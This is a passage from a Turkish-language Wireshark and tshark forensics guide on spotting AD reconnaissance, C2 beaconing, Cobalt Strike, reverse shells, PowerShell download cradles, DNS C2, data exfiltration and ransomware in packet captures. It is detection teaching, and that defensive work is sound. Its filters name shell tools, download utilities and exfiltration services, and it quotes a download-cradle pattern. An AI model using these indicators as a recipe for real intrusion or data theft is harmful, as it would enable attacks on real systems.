2. Bağlanılan hedef makineleri listele; saldırganın gördüğü makineler bunlardır.
3. NBNS sorgularıyla hangi makine adlarının arandığını çıkar.
4. Keşif zamanını zaman çizelgesine ekle; genelde ilk erişimden hemen sonradır.

**Terimler:**

- **IPC$**: Inter-Process Communication paylaşımı; sayım için kullanılır.
- **Enumeration**: Kaynakların (paylaşım, kullanıcı, makine) sistemli biçimde listelenmesi.

> **Anlık karar:** Çok hedefe IPC$ + hemen ardından spesifik paylaşımlara erişim = keşiften eyleme geçiş. İki aşamayı ayır.


</details>

<details>
<summary><strong>171 · Kerberos üzerinden kullanıcı hesaplarını eşleştirmek</strong></summary>

**Metafor:** Gişe defterinden, günün hangi saatinde kimlerin bilet aldığını çıkarıp kişi-zaman tablosu yapmak.

**Senden istenen:** "Hangi kullanıcı ne zaman kimlik doğruladı?", "Bir IP'yi kullanıcıya nasıl bağlarım?"

**Filtreler (araştırma yolu):**

- `kerberos.CNameString` → bilet isteyen hesap adı
- `kerberos.CNameString && kerberos.msg_type == 10` → AS-REQ'teki hesaplar
- `kerberos.realm` → domain (realm) adı

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'kerberos.CNameString' -T fields -e frame.time_utc -e ip.src -e kerberos.CNameString -e kerberos.realm | sort -u
```

**Filtreden sonra yol tarifi:**

1. Kerberos CNameString'i filtrele ve kaynak IP ile birlikte tablo çıkar.
2. Sonu "$" ile biten adlar makine hesabıdır (DESKTOP-ABC$); bitmeyen adlar kullanıcıdır.
3. Bu tablo IP ↔ kullanıcı eşleşmesi kurar; olaydaki "hangi IP hangi kişi" sorusunu yanıtlar.
4. Beklenmedik eşleşmeleri (bir kullanıcının alışılmadık bir makineden görünmesi) işaretle.

**Terimler:**

- **CNameString**: Kerberos'taki istemci (hesap) adı.
- **Realm**: Kerberos'un domain karşılığı (genelde BÜYÜK HARF).
- **Makine hesabı**: Sonu $ ile biten bilgisayar hesabı.

> **Anlık karar:** Kerberos, IP'yi kullanıcıya bağlamanın en güvenilir ağ kaynağıdır. DHCP/NBNS'ten daha nettir.


</details>

<details>
<summary><strong>172 · MS-RPC üzerinden dizin çoğaltma (replikasyon) çağrıları</strong></summary>

**Metafor:** Bir arşivin tamamının "yedekleme" bahanesiyle kopyalanmasını istemek; normalde sadece yedek sunucular bunu ister.

**Senden istenen:** "Dizin çoğaltma arayüzüne olağan dışı bir erişim var mı?"

**Filtreler (araştırma yolu):**

- `dcerpc.cn_bind_to_uuid == e3514235-4b06-11d1-ab04-00c04fc2dcd2` → drsuapi (dizin replikasyon) arayüzü
- `drsuapi.opnum == 3` → DRSGetNCChanges çağrısı

**Filtreden sonra yol tarifi:**

1. drsuapi arayüzüne bağlanan kaynağı belirle.
2. Bu arayüze erişimi normalde yalnızca domain controller'lar yapar; bir iş istasyonundan veya beklenmedik bir hesaptan gelmesi olağan dışıdır.
3. DRSGetNCChanges çağrısı dizin verisinin çekilmesini ister; kaynağı DC değilse incelemede yüksek öncelik verilir.
4. Kesinleştirmek için DC loglarıyla (replikasyon olayları) eşleştir ve ilgili hesapların parolasının değiştirilmesini öner.

**Terimler:**

- **DRSUAPI**: Directory Replication Service; DC'ler arası dizin çoğaltma arayüzü.
- **Replikasyon**: Domain controller'ların birbirleriyle veri eşitlemesi.

> **Anlık karar:** drsuapi'ye DC olmayan bir kaynaktan erişim, AD incelemesinde en yüksek öncelikli bulgulardandır. Kaynağın DC olup olmadığını önce doğrula.


</details>

<details>
<summary><strong>173 · SMB üzerinden NTLM taşınan oturumları toplu çıkarmak</strong></summary>

**Metafor:** Bütün giriş kayıtlarını tek bir tabloda toplayıp kim-nereye-ne zaman özetini çıkarmak.

**Senden istenen:** "Tüm kimlik doğrulama olaylarını tek listede ver."

**Filtreler (araştırma yolu):**

- `ntlmssp.messagetype == 0x00000003 || kerberos.CNameString || ldap.protocolOp == 0` → NTLM + Kerberos + LDAP oturum açmaları

**Menü / araç:**

- Tools ▸ Credentials → Wireshark'ın bulduğu tüm kimlik doğrulama olayları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ntlmssp.messagetype == 0x00000003' -T fields -e frame.time_utc -e ip.src -e ip.dst -e ntlmssp.auth.domain -e ntlmssp.auth.username
```

**Filtreden sonra yol tarifi:**

1. Tools ▸ Credentials penceresini aç; Wireshark düz metin ve bazı kimlik doğrulama olaylarını otomatik toplar.
2. tshark ile NTLM, Kerberos ve LDAP oturumlarını ayrı ayrı tablo yapıp birleştir.
3. "zaman - kaynak - hedef - domain - hesap" formatında tek bir ana kimlik tablosu oluştur.
4. Bu tabloyu yanal hareket haritası ve zaman çizelgesiyle çapraz kontrol et.

**Terimler:**

- **Credentials penceresi**: Wireshark'ın kimlik doğrulama olaylarını topladığı araç.

> **Anlık karar:** AD olaylarında önce tek bir birleşik kimlik tablosu kur; sonraki tüm sorular (kim, nereden, ne zaman) bu tablodan yanıtlanır.


</details>

<details>
<summary><strong>174 · DNS adlarının NetBIOS/LLMNR ile doğrulanmaya çalışılması (zehirleme ortamı)</strong></summary>

**Metafor:** Rehberde bulunamayan bir ismi koridora bağırarak sormak; kötü niyetli biri "o benim" diyebilir.

**Senden istenen:** "Var olmayan bir isme kim cevap veriyor, sonrasında kimlik doğrulama o adrese mi gidiyor?"

**Filtreler (araştırma yolu):**

- `llmnr && dns.flags.response == 1` → LLMNR cevapları
- `nbns.flags.response == 1` → NBNS cevapları
- `(llmnr || nbns) && ip.src == 10.0.0.66` → belirli bir adresten gelen isim cevapları

**Filtreden sonra yol tarifi:**

1. DNS'in bulamadığı adların LLMNR/NBNS ile sorulduğu paketleri izle.
2. Var olmayan bir isme sürekli aynı adresten cevap geliyorsa, o adres incelemede öncelikli not edilir (isim zehirleme ortamı).
3. Cevabı veren adrese hemen ardından SMB/HTTP bağlantısı ve NTLM oturum açma gidiyor mu kontrol et.
4. Gidiyorsa kimlik materyali o adrese taşınmış demektir; etkilenen hesabı ve zamanı kaydet.

**Terimler:**

- **LLMNR/NBNS**: DNS başarısız olunca devreye giren yerel isim çözme protokolleri.
- **İsim zehirleme**: Var olmayan isme sahte cevap vererek trafiği kendine çekme.

> **Anlık karar:** Soru normaldir, cevabı şüphelidir. "Var olmayan isme kim 'benim' diyor?" sorusu bütün analizi yönlendirir.


</details>

<details>
<summary><strong>175 · DC'ye yönelik olağan dışı kimlik doğrulama yoğunluğu</strong></summary>

**Metafor:** Bir kurumun merkez kayıt bürosuna, kısa sürede alışılmadık kadar çok "kimlik doğrula" talebi gelmesi.

**Senden istenen:** "Domain controller'a anormal kimlik doğrulama/istek yoğunluğu var mı?"

**Filtreler (araştırma yolu):**

- `ip.dst == 10.0.0.10 && kerberos` → DC'ye giden Kerberos trafiği
- `ip.dst == 10.0.0.10 && (tcp.port == 88 || tcp.port == 389 || tcp.port == 445)` → DC'nin kimlik/dizin portlarına trafik

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → DC IP'si için akış sayısı ve kaynak çeşitliliği

**Filtreden sonra yol tarifi:**

1. DC IP'sine giden Kerberos/LDAP/SMB trafiğini filtrele.
2. Statistics ▸ Conversations'ta "Limit to display filter" ile DC'ye en çok bağlanan kaynakları çıkar.
3. Tek bir kaynaktan kısa sürede çok sayıda farklı hesap için istek = keşif veya deneme dalgası.
4. I/O Graph ile yoğunluğun zamanını bul ve diğer olaylarla (ilk erişim, yanal hareket) hizala.

**Terimler:**

- **Domain controller**: Kimlik doğrulama ve dizini yöneten merkezi Windows sunucusu.
- **Baseline**: Normal davranışın referans seviyesi; anomaliyi ondan sapma olarak ölçersin.

> **Anlık karar:** DC'ye yoğunluk tek başına kötü değildir (zaten çok konuşulur); kaynağın ve hesap çeşitliliğinin alışılmadık olması önemlidir.


</details>

## H · Zararlı Yazılım, C2 ve Veri Sızdırma Trafiği

*İlk erişimden sonraki hikâye: zararlı dışarıyla nasıl konuşuyor, ne indiriyor, ne çıkarıyor. Burada kalıp (pattern) okumayı öğrenirsin: ritim, boyut, yön ve içerik birleşince "bu bir arka kapı" dersin.*

<details>
<summary><strong>176 · C2 beaconing: düzenli aralıklı "yoklama" trafiği</strong></summary>

**Metafor:** Her 60 saniyede merkeze telsizle "emir var mı?" diye soran bir ajan. İçerik gizli olsa da ritim ele verir.

**Senden istenen:** "Periyodik komuta-kontrol trafiği var mı, aralığı ne?"

**Filtreler (araştırma yolu):**

- `ip.dst == 203.0.113.50 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → şüpheli hedefe her yeni bağlantı
- `ip.addr == 203.0.113.50` → o hedefle tüm trafik

**Menü / araç:**

- Statistics ▸ I/O Graphs → hedef için 1 sn aralıkta testere dişi deseni
- Statistics ▸ Conversations ▸ TCP → aynı hedefe çok sayıda benzer boyutlu kısa akış

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ip.dst == 203.0.113.50 && tcp.flags.syn == 1' -T fields -e frame.time_epoch | awk 'NR>1{print $1-prev} {prev=$1}'
```

**Filtreden sonra yol tarifi:**

1. Hedefe giden yeni bağlantıları filtrele, frame.time_delta_displayed sütununu ekle.
2. Ardışık bağlantılar arası süre neredeyse sabitse (60, 61, 59...) beacon'dır.
3. tshark komutuyla bağlantılar arası farkları hesapla; farkların standart sapması küçükse düzenlilik kanıtlanır.
4. Jitter (rastgele sapma) varsa aralık bir orta değer etrafında salınır; yine de insan trafiğinden çok daha düzenlidir.
5. Hedefin SNI/sertifika/JA3'ü ile altyapıyı tanımla.

**Terimler:**

- **Beaconing**: Zararlının periyodik kontrol bağlantısı.
- **Jitter**: Tespitten kaçmak için aralığa eklenen rastgele sapma.
- **Standart sapma**: Değerlerin ortalamadan ne kadar saçıldığı; küçükse çok düzenli.

> **Anlık karar:** İnsan düzensiz, makine düzenlidir. Gece boyu dakikada bir aynı yere giden bağlantı insan değildir.


</details>

<details>
<summary><strong>177 · Beacon aralığını ve jitter'ı ölçmek</strong></summary>

**Metafor:** Bir kalp atışının ritmini sayıp "dakikada kaç, ne kadar düzenli?" demek.

**Senden istenen:** "Beacon aralığı tam olarak kaç saniye, jitter yüzde kaç?"

**Filtreler (araştırma yolu):**

- `ip.addr == 203.0.113.50 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → sadece bağlantı başlangıçları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ip.dst == 203.0.113.50 && tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e frame.time_epoch > t.txt
awk 'NR>1{d=$1-p; print d} {p=$1}' t.txt | sort -n | awk '{a[NR]=$1; s+=$1} END{print "ortalama="s/NR, "medyan="a[int(NR/2)], "min="a[1], "max="a[NR]}'
```

**Filtreden sonra yol tarifi:**

1. Bağlantı başlangıç zamanlarını epoch olarak çıkar.
2. Ardışık farkları hesapla; ortalama = yaklaşık beacon aralığı.
3. min ve max farkı ortalamayla karşılaştır; dar aralık = düşük jitter, geniş aralık = yüksek jitter.
4. I/O Graph'ta görsel olarak da doğrula; düzenli dişler beacon'ı gözle gösterir.
5. Aralığı raporla (ör. "~60 sn, %10 jitter"); bu değer aracı/profili tahmin etmeye yarar.

**Terimler:**

- **Interval**: Beacon'lar arası hedef süre.
- **Medyan**: Sıralı değerlerin ortancası; aykırı değerlerden az etkilenir.

> **Anlık karar:** Ortalama aralık + düşük sapma = otomatik beacon. Sayıyı rapora koy; "düzensiz görünüyor" demekten iyidir.


</details>

<details>
<summary><strong>178 · Cobalt Strike belirtileri</strong></summary>

**Metafor:** Belirli bir marka telsizin kendine özgü anten ve ses tonu. Varsayılan ayarlı olanı uzaktan tanırsın.

**Senden istenen:** "Cobalt Strike kullanımı belirtisi var mı?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "/(ca|dpixel|__utm\\.gif|pixel\\.gif|submit\\.php|load)$"` → varsayılan Malleable C2 profillerinde görülen yollar
- `http.request.uri == "/" && http.user_agent contains "MSIE" && http.cookie` → sahte çerezle GET (varsayılan profil)
- `tls.handshake.extensions_server_name && tcp.dstport == 50050` → team server varsayılan portu
- `x509af.serialNumber == 146473198` → Cobalt Strike'ın meşhur varsayılan sertifika seri numarası

**Filtreden sonra yol tarifi:**

1. HTTP beacon'larında varsayılan URI desenlerini ve sabit User-Agent'ı ara.
2. Çerez tabanlı GET + sabit aralık klasik varsayılan profildir; özelleştirilmiş profiller farklı görünür.
3. TLS kullanıyorsa varsayılan sertifika seri numarasını ve JA3'ü kontrol et.
4. GET (checkin) ve POST (çıktı gönderme) ayrımına bak; POST boyutu komut çıktısının büyüklüğünü gösterir.

**Terimler:**

- **Cobalt Strike**: Yaygın kullanılan (meşru ve kötüye kullanılan) komuta-kontrol çerçevesi.
- **Malleable C2**: Cobalt Strike'ın trafiğini özelleştirilebilir profille taklit etmesi.

> **Anlık karar:** Varsayılan profiller tanıdıktır; özelleştirilmişlerde ritim + JA3 + sertifika üçlüsüne düş.


</details>

<details>
<summary><strong>179 · HTTP tabanlı C2 kanalını okumak</strong></summary>

**Metafor:** İki kişinin ilan panosu üzerinden haberleşmesi: biri not bırakır (GET ile alır), öbürü cevabı panoya asar (POST ile gönderir).

**Senden istenen:** "C2 komutları ve çıktıları HTTP'de nasıl taşınıyor?"

**Filtreler (araştırma yolu):**

- `http.request.method == "GET" && ip.dst == 203.0.113.50` → check-in (komut alma)
- `http.request.method == "POST" && ip.dst == 203.0.113.50` → çıktı gönderme
- `http.request.uri.query.parameter` → URL'de taşınan kodlu veri
- `http.file_data && ip.dst == 203.0.113.50` → POST gövdesindeki veri

**Filtreden sonra yol tarifi:**

1. Hedefe giden GET ve POST'ları ayır. GET'ler düzenli ve küçük (check-in), POST'lar düzensiz ve değişken boyutlu (çıktı) olur.
2. Follow HTTP Stream ile istek-cevap çiftlerini oku. Komutlar cevap gövdesinde, çıktılar POST gövdesinde olur; çoğu base64/XOR ile gizlenir.
3. Kodlu veriyi CyberChef ile çöz (base64 → gzip → XOR sıralarını dene).
4. Büyük POST'lar veri sızdırma veya büyük komut çıktısı anlamına gelir; boyutu not et.

**Terimler:**

- **Check-in**: Beacon'ın komut almak için yaptığı düzenli istek.
- **Staging**: C2'nin asıl kodunu ikinci aşamada indirmesi.

> **Anlık karar:** GET = "emir var mı?", POST = "işte sonuç". İki yönü ayırırsan kanalın mantığı netleşir.


</details>

<details>
<summary><strong>180 · İlk aşama yükleyici (stager/downloader) indirmesi</strong></summary>

**Metafor:** Casusun önce küçük bir anahtar alıp, o anahtarla asıl dosya dolabını açması.

**Senden istenen:** "Küçük bir indirici, ardından büyük asıl yükü mü çekti?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "\\.(ps1|hta|js|vbs|bat|jar|scr)$"` → betik tabanlı yükleyiciler
- `http.user_agent matches "(powershell|certutil|bitsadmin|mshta|wscript|cscript|curl|wget)"` → sistem araçlarıyla indirme
- `http.response.code == 200 && http.content_length > 100000 && ip.dst == 10.0.0.20` → büyük ikinci aşama indirmesi

**Filtreden sonra yol tarifi:**

1. Küçük bir betik indirmesini bul (genelde birkaç KB).
2. O betiğin içeriğini Follow Stream ile oku; içinde bir sonraki URL (asıl yük) genelde yazılıdır.
3. İkinci aşama indirmesini bul (büyük dosya, çoğu zaman .exe/.dll veya şifreli blob).
4. İki aşamanın da kaynağını (URL/IP) IOC listesine ekle; dosyaları Export Objects ile çıkar.

**Terimler:**

- **Stager**: Asıl yükü indiren küçük ilk aşama.
- **Living off the land**: Sistemde hazır bulunan meşru araçların (certutil, bitsadmin) kötüye kullanımı.

> **Anlık karar:** "Küçük betik indir → o betik büyük dosya indir" zinciri, enfeksiyonun klasik iki aşamasıdır. İlkini bulunca ikinciyi URL'den takip et.


</details>

<details>
<summary><strong>181 · Reverse shell trafiği (düz metin)</strong></summary>

**Metafor:** Kurbanın kendi telefonundan saldırganı arayıp "buyur, komutlarını bekliyorum" demesi. Böylece gelen aramaları engelleyen güvenlik atlatılır.

**Senden istenen:** "Etkileşimli uzak kabuk var mı, hangi komutlar çalıştırıldı?"

**Filtreler (araştırma yolu):**

- `tcp.port == 4444` → Metasploit/netcat varsayılan portu
- `tcp.dstport in {4444, 4445, 1337, 9001, 9002, 5555} && tcp.flags.syn == 1 && tcp.flags.ack == 0` → klasik shell portlarına bağlantı
- `frame contains "/bin/sh" || frame contains "/bin/bash" || frame contains "cmd.exe" || frame contains "powershell"` → kabuk başlatma izleri
- `frame contains "uid=" || frame contains "whoami" || frame contains "Microsoft Windows [Version"` → kabuk çıktısı imzaları

**Filtreden sonra yol tarifi:**

1. Şüpheli porta kurulan bağlantıyı bul ve Follow TCP Stream ile aç.
2. Düz metin reverse shell'de komutlar (whoami, id, ls, dir) ve çıktılar doğrudan okunur.
3. Bağlantıyı kimin başlattığına bak; iç host → dış host SYN = reverse shell (firewall'u atlatır).
4. Çalıştırılan komutları sırayla çıkar ve zaman çizelgesine ekle.
5. Şifreli reverse shell'de içerik görünmez; port, yön, süre ve boyutla değerlendir.

**Terimler:**

- **Reverse shell**: Kurbanın saldırgana bağlanıp kendi kabuğunu sunması.
- **Bind shell**: Kurbanın port açıp saldırganın bağlanmasını beklemesi.

> **Anlık karar:** İç hosttan dışa, garip portta, uzun ömürlü, düz metin kabuk çıktısı taşıyan bağlantı = reverse shell. Dördü birden görürsen tartışma biter.


</details>

<details>
<summary><strong>182 · PowerShell indirme ve çalıştırma (download cradle)</strong></summary>

**Metafor:** Bir ajanın telefonla dikte edilen talimatı kâğıda yazmadan doğrudan uygulaması.

**Senden istenen:** "PowerShell ile dosyasız (fileless) indirme/çalıştırma var mı?"

**Filtreler (araştırma yolu):**

- `http.user_agent contains "WindowsPowerShell"` → PowerShell'in varsayılan User-Agent'ı
- `http.file_data contains "IEX" || http.file_data contains "Invoke-Expression"` → bellek içi çalıştırma
- `http.file_data contains "DownloadString" || http.file_data contains "DownloadFile"` → indirme komutları
- `http.file_data contains "FromBase64String" || http.file_data contains "-enc"` → kodlanmış komut

**Filtreden sonra yol tarifi:**

1. PowerShell User-Agent'lı istekleri bul; indirilen içeriği Follow Stream ile oku.
2. IEX (Invoke-Expression) + DownloadString kalıbı, diske yazmadan bellekte çalıştırma (download cradle) demektir.
3. Base64 veya -EncodedCommand varsa çöz (base64 -d, gerekiyorsa UTF-16LE); asıl komut ortaya çıkar.
4. İndirilen sonraki yükleri ve C2 adreslerini çıkar.

**Terimler:**

- **Download cradle**: PowerShell'in dosyayı diske yazmadan indirip çalıştırması.
- **IEX**: Invoke-Expression; metni komut olarak çalıştırır.
- **Fileless**: Diskte iz bırakmadan, bellekte çalışan zararlı.

> **Anlık karar:** "IEX (New-Object Net.WebClient).DownloadString(...)" kalıbı neredeyse her zaman zararlıdır. Bu satırı tanı.


</details>

<details>
<summary><strong>183 · DNS üzerinden C2 (TXT/CNAME tabanlı)</strong></summary>

**Metafor:** İlan panosu yerine telefon rehberi üzerinden haberleşmek: her "rehber sorgusu" aslında bir mesaj, her "cevap" bir emir.

**Senden istenen:** "Komuta-kontrol DNS üzerinden mi yürüyor?"

**Filtreler (araştırma yolu):**

- `dns.qry.type == 16 && dns.flags.response == 0` → TXT sorguları (komut alma)
- `dns.qry.name.len > 40 && dns.flags.response == 0` → uzun sorgular (çıktı gönderme)
- `dns.qry.name contains "saldirgan-c2.com"` → bilinen C2 alanına sorgular

**Filtreden sonra yol tarifi:**

1. Tek bir ana alana giden sürekli ve düzenli DNS sorgularını bul (beacon ritmi DNS'te de olur).
2. TXT cevaplarını oku; base64/hex komutlar içerebilir (Problem 078).
3. Uzun alt alan adları giden veriyi (çıktı) taşır; parçaları birleştir (Problem 088).
4. Aralığı ve veri yönünü belgele; DNS C2 genelde yavaştır ama firewall'ları rahat geçer.

**Terimler:**

- **DNS C2**: Komut ve veriyi DNS sorgu/cevaplarında taşıyan komuta-kontrol.
- **TXT kaydı**: Serbest metin taşıyabilen DNS kaydı.

> **Anlık karar:** İş istasyonunun sürekli TXT sorgulaması + tek ana alan + düzenli ritim = DNS C2. Üç işaret yeterli.


</details>

<details>
<summary><strong>184 · Veri sızdırma: ne kadar, nereye, hangi kanal?</strong></summary>

**Metafor:** Bir binadan dışarı taşınan kolilerin toplam ağırlığını, çıkış kapısını ve taşıyıcıyı tespit etmek.

**Senden istenen:** "Bu olayda ne kadar veri, hangi kanaldan dışarı çıktı?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.0/8 && !(ip.dst == 10.0.0.0/8) && tcp.len > 0` → iç ağdan dışa giden veri
- `(http.request.method == "POST" || ftp-data || tls.record.content_type == 23) && !(ip.dst == 10.0.0.0/8)` → sızdırmada sık kullanılan kanallar

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → iç→dış yönünde "Bytes A→B" en büyük akışlar

**Filtreden sonra yol tarifi:**

1. Dışa giden akışları byte miktarına göre sırala (Conversations, iç→dış yön).
2. Her büyük akışın kanalını belirle: HTTP POST, FTP, şifreli, DNS, bulut depolama.
3. Toplam sızdırılan veriyi hesapla; normal yükleme (yedekleme, bulut senkron) ile karşılaştır.
4. Zamanı (mesai dışı mı?) ve hedefi değerlendir; raporda "yaklaşık X MB, Y kanalından, Z adresine" de.

**Terimler:**

- **Exfiltration**: Verinin yetkisiz dışarı çıkarılması.
- **Upload/download oranı**: Normalde indirme baskındır; tersine dönmesi sızdırma işaretidir.

> **Anlık karar:** İç ağ genelde alır, nadiren çok gönderir. Dışa giden büyük akış, kanalı ne olursa olsun, önce sızdırma varsayımıyla incelenir.


</details>

<details>
<summary><strong>185 · Sıkıştırılmış/arşiv dosya sızdırması</strong></summary>

**Metafor:** Belgeleri tek tek değil, bir bavula doldurup öyle çıkarmak.

**Senden istenen:** "Toplu dosya (zip/rar) sızdırılmış mı?"

**Filtreler (araştırma yolu):**

- `http.file_data[0:2] == "PK"` → ZIP arşiv başlığı (PK)
- `frame contains "Rar!"` → RAR arşiv imzası
- `frame contains 37:7a:bc:af:27:1c` → 7z imzası
- `http.content_type contains "zip" || http.content_type contains "octet-stream"` → arşiv indirme/yükleme

**Filtreden sonra yol tarifi:**

1. Dışa giden trafikte arşiv imzalarını (PK, Rar!, 7z) ara.
2. Arşivi Export Objects veya Follow Stream ▸ Raw ile çıkar.
3. Arşivin boyutuna ve içindeki dosya adlarına (zip dizini düz metin görünebilir) bak.
4. Parola korumalı arşiv sızdırmada sık kullanılır; içeriği göremesen bile varlığı ve boyutu bulgudur.

**Terimler:**

- **Arşiv imzası**: ZIP "PK" (50 4B), RAR "Rar!", 7z (37 7A BC AF).
- **Staging**: Sızdırmadan önce verinin tek dosyada toplanması.

> **Anlık karar:** Dışarı giden bir "PK" başlığı, toplu veri sızdırmanın en net ağ işaretlerinden biridir.


</details>

<details>
<summary><strong>186 · Bulut depolama ve meşru servisler üzerinden sızdırma</strong></summary>

**Metafor:** Çalınan belgeleri tanınmış bir kargo şirketiyle göndermek; kimse markalı kamyondan şüphelenmez.

**Senden istenen:** "Veri meşru bulut servisleri (Dropbox, Drive, pastebin, Telegram) üzerinden mi çıkarıldı?"

**Filtreler (araştırma yolu):**

- `tls.handshake.extensions_server_name matches "(dropbox|drive\\.google|onedrive|mega\\.nz|pastebin|transfer\\.sh|anonfiles|telegram|discord|t\\.me|api\\.telegram)"` → sık kötüye kullanılan servisler
- `http.host matches "(pastebin|paste\\.ee|ghostbin|transfer\\.sh|0x0\\.st)"` → metin/dosya paylaşım siteleri

**Filtreden sonra yol tarifi:**

1. Bu servislere giden TLS bağlantılarını SNI üzerinden listele.
2. Yükleme yönündeki veri miktarına bak (iç→dış büyük akış); normal kullanım indirme ağırlıklıdır.
3. Discord/Telegram webhook'ları (api.telegram.org, discord.com/api/webhooks) zararlıların favori sızdırma kanalıdır.
4. Meşru servis olması sızdırmayı dışlamaz; yön + hacim + zaman + kullanıcı bağlamıyla karar ver.

**Terimler:**

- **Webhook**: Bir servise veri göndermek için kullanılan özel URL.
- **Legitimate service abuse**: Meşru servislerin kötü amaçla kullanılması.

> **Anlık karar:** "Tanıdık marka" güven sebebi değildir. Dropbox'a mesai dışı 2 GB yükleme, Dropbox olduğu için değil, o yüzden şüphelidir.


</details>

<details>
<summary><strong>187 · İndirilen dosyanın gerçek türünü doğrulamak (magic bytes)</strong></summary>

**Metafor:** Üstünde "fatura.pdf" yazan dosyanın içini açınca çalıştırılabilir program çıkması.

**Senden istenen:** "İndirilen dosya gerçekten iddia ettiği tür mü?"

**Filtreler (araştırma yolu):**

- `http.response && http.content_type contains "image" && http.file_data[0:2] == "MZ"` → resim diye gelen EXE
- `http.file_data[0:4] == 25:50:44:46` → %PDF imzası
- `http.file_data[0:2] == 50:4b` → ZIP/Office belgeleri (docx, xlsx içerir)
- `http.file_data[0:4] == d0:cf:11:e0` → eski Office (doc/xls) imzası

**Filtreden sonra yol tarifi:**

1. Dosyayı Export Objects ile çıkar.
2. İlk byte'larına bak (xxd ile) veya file komutu çalıştır; uzantıdan bağımsız gerçek türü verir.
3. Uzantı ile içerik uyuşmuyorsa (resim ama MZ, pdf ama PK) gizleme vardır; zararlı göstergesi olarak işaretle.
4. Office belgeleri (PK veya D0CF) makro taşıyabilir; içeriğini ayrıca incele (Problem 184).

**Terimler:**

- **Magic bytes**: Dosya türünü belirten ilk byte'lar.
- **Double extension**: fatura.pdf.exe gibi çift uzantıyla gizleme.

> **Anlık karar:** Uzantı yalan söyleyebilir, magic bytes söylemez. Her çıkarılan dosyada ilk refleksin "file" komutu olsun.


</details>

<details>
<summary><strong>188 · XOR/basit şifrelemeyle gizlenmiş C2 verisi</strong></summary>

**Metafor:** Her harfi bir sonrakiyle değiştiren basit bir çocuk şifresi; anahtarı bulunca mesaj okunur.

**Senden istenen:** "C2 verisi basit bir şifreyle mi gizlenmiş, nasıl çözerim?"

**Filtreler (araştırma yolu):**

- `tcp.payload && tcp.dstport == 8080` → şüpheli porttaki ham yük
- `http.file_data && !http.content_encoding` → sıkıştırılmamış ama okunamayan gövde

**Filtreden sonra yol tarifi:**

1. Okunamayan ama rastgele de görünmeyen (tekrar eden desenli) veriyi şüphelen; XOR'lu veride desen sızar.
2. Veriyi Follow Stream ▸ Raw ile çıkar, CyberChef'e ver.
3. CyberChef "XOR Brute Force" ile tek byte anahtarları dene; okunabilir metin (komut, URL) çıkan anahtar doğrudur.
4. Çok aşamalı olabilir: base64 → XOR → gzip. Sırayı deneyerek çöz.
5. Çözülen komutları ve adresleri IOC'ye ekle.

**Terimler:**

- **XOR**: Basit, tersine çevrilebilir bit işlemiyle şifreleme.
- **CyberChef**: Kodlama/şifre çözme için tarayıcı tabanlı "İsviçre çakısı" aracı.

> **Anlık karar:** "Rastgele gibi ama tam değil" veri genelde XOR'ludur. Tek byte XOR brute force çoğu basit zararlıyı çözer.


</details>

<details>
<summary><strong>189 · Ransomware ağ belirtileri</strong></summary>

**Metafor:** Bir binadaki tüm kasaların kısa sürede tek tek açılıp içinin boşaltılması ve kapılara fidye notu asılması.

**Senden istenen:** "Fidye yazılımı aktivitesi var mı, yayılma ne zaman başladı?"

**Filtreler (araştırma yolu):**

- `smb2.cmd == 9 && smb2.write_length > 0` → yoğun dosya yazma
- `smb2.filename matches "(README|DECRYPT|RECOVER|HOW_TO|_readme|\\.onion)"` → fidye notu dosya adları
- `smb2.filename matches "\\.(locked|encrypted|crypt|crypted|enc|[a-z0-9]{6,8})$"` → şifrelenmiş dosya uzantıları

**Filtreden sonra yol tarifi:**

1. Kısa sürede çok sayıda SMB Write + hemen ardından aynı dosyaların yeniden adlandırılması = toplu şifreleme.
2. Fidye notu dosya adlarını (README.txt, HOW_TO_DECRYPT) ara; yayılan paylaşımları gösterir.
3. I/O Graph'ta SMB yazma hacminin ani patlamasıyla başlangıç anını bul.
4. Şifrelemeyi yürüten kaynak makineyi belirle (en çok Write yapan); izolasyon için kritiktir.
5. Yayılma mekanizmasını ara: öncesinde SMBv1 exploit, zayıf parola veya zamanlanmış görev olabilir.

**Terimler:**

- **Ransomware**: Dosyaları şifreleyip fidye isteyen zararlı.
- **Fidye notu**: Şifrelemeden sonra bırakılan ödeme talimatı dosyası.

> **Anlık karar:** Patlayan SMB yazma + yeni tuhaf uzantılar + fidye notu = ransomware. Kaynağı bul ve derhal izole et.


</details>

<details>
<summary><strong>190 · Zararlının kullandığı altyapıyı (IOC) çıkarmak</strong></summary>

**Metafor:** Bir suç şebekesinin kullandığı tüm telefon numaralarını, adresleri ve araçları tek dosyada toplamak.

**Senden istenen:** "Bu olaya ait tüm göstergeleri (IP, alan, hash, URL) listele."

**Filtreler (araştırma yolu):**

- `dns.flags.response == 1 && dns.a && ip.dst == 10.0.0.20` → kurbanın çözdüğü tüm alanlar/IP'ler
- `tls.handshake.extensions_server_name && ip.src == 10.0.0.20` → kurbanın bağlandığı TLS alanları
- `http.request && ip.src == 10.0.0.20` → kurbanın HTTP hedefleri

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ip.src == 10.0.0.20 && (http.host || tls.handshake.extensions_server_name)' -T fields -e http.host -e tls.handshake.extensions_server_name | sort -u
```

**Filtreden sonra yol tarifi:**

1. Kurbanın bağlandığı tüm dış hedefleri (IP, alan, URL) çıkar.
2. İndirilen dosyaların hash'lerini ekle (Export Objects + sha256sum).
3. Göstergeleri kategorize et: ağ (IP/alan/URL), dosya (hash/ad), davranış (port/aralık).
4. Pivot yap: bir IOC'den diğerlerine ulaş (aynı IP'ye çözülen başka alanlar, aynı JA3'ü kullanan başka hostlar).
5. Listeyi engelleme (blocklist) ve avlanma (threat hunting) için SOC'a ver.

**Terimler:**

- **IOC**: Indicator of Compromise; ele geçirilme göstergesi.
- **Pivot**: Bir göstergeden ilişkili başkalarını bulma.

> **Anlık karar:** Her olay bir IOC listesiyle biter. Bu liste hem müdahaleyi hem de gelecekteki tespiti besler.


</details>

<details>
